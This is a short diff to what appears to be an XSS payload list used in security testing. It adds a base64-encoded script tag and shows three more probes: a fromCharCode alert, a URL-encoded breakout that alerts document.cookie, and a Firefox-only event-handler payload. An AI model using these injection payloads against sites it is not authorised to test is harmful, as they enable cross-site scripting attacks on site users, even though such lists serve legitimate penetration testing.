@@ -1,3 +1,4 @@
+PHNjcmlwdD5hbGVydCgiZG9jdW1lbnQuZG9tYWluIik8L3NjcmlwdD4=
 <​script>alert(String.fromCharCode(79,80,69,78,66,85,71,66,79,85,78,84,89))<​/script>
 ax6zt%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3Ey6uu6
 <p oncontentvisibilityautostatechange​="alert(/FirefoxOnly/)" style="content-visibility:auto">
